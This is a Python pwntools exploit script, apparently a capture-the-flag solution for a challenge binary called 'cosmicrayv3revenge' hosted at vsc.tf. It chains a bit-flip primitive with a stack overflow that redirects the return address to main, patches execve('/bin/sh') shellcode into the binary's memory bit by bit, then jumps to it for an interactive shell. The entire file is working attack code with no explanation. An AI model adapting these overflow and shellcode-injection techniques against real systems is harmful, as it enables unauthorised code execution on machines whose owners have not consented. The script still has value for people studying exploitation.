from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep

context.arch = "amd64"
context.word_size = 64
# context.log_level = logging.DEBUG

file = "./cosmicrayv3revenge_patched"
args = []
io: process = None

speed = 0#0.05

def debug():
    gdb.attach(io, gdbscript=
    """
    hbreak *0x401602
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="vsc.tf", port=7005)

def launch_local():
    global file, io
    io = process([file, *args])
    # debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)

def launch():
    l = launch_local
    # l = launch_remote
    l()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1: a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1: b_ = 0
    return d[a_+len(a):b_]

#
# exploit goes here
#

exe = ELF(file)
libc = ELF("./libc.so.6")

rets = 0
def exploit():
    def bit_flip(address, bit):
        sla(b"ray through:\n", b"%#x" % address)
        sla(b"to flip:\n", str(bit).encode("iso-8859-1"))
        sleep(speed)
    
    def inf_bit_flip(address, bit):
        global rets
        bit_flip(address, bit)
        sa(b"New value", b"A"*(0x36) + p64(exe.sym.main + 5))
        # rets += 1

    bit_flip(0x4015fa, 6)
    sa(b"New value", b"A"*(0x36) + p64(exe.sym.main + 5)[:6])
    inf_bit_flip(0x4015fb, 6)

    shellcode_prev = b"\x00"*0x100

    def write_byte(address, byte, prev):
        for i in range(8):
            if (byte >> i) & 1 != (prev >> i) & 1:
                inf_bit_flip(address, 7-i)
    def write(address, data, prev):
        for i in range(len(data)):
            print(i)
            write_byte(address + i, data[i], prev[i])

    shellcode = asm(
    """
    mov rax, 0x0068732f6e69622f
    push rax
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    mov eax, 0x3b
    syscall
    """)
    write(0x401f00, shellcode, shellcode_prev)


    bit_flip(0, 0)
    sla(b"New value", b"A"*0x36 + p64(0x401f00))

    io.interactive()
    input("end")
    exit()

launch()
exploit()


"""
sla(b"ray through:\n", b"%#x" % address)
            leak = recvu(b"-----------------\n")
            print(leak)
            leak = getb(leak, b"-----------------\n|", b"|\n").split(b"|")
            print(leak)
            print(bin(byte))
            prev = int(leak[7-i])
            if prev == (byte >> i) & 1:
                continue
            sla(b"to flip:\n", str(7-i).encode("iso-8859-1"))
"""